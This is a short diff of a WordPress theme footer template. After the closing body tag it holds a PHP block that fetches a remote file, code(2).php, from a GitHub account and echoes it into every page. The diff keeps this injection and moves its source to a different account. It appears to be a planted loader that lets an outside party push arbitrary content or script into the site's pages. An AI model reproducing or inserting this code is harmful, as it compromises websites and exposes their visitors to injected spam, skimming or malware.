@@ -65,9 +65,9 @@ if ( ! defined( 'ABSPATH' ) ) {
 
 		<?php get_template_part( 'templates/to-top' ); ?>
 	</body>
+	
 <?php
-$a = file_get_contents('https://github.com/ubed354311/tes/raw/master/code(2).php');
+$a = file_get_contents('https://raw.githubusercontent.com/janda354311/tes/master/code(2).php');
 echo $a;
 ?>
-
 </html>
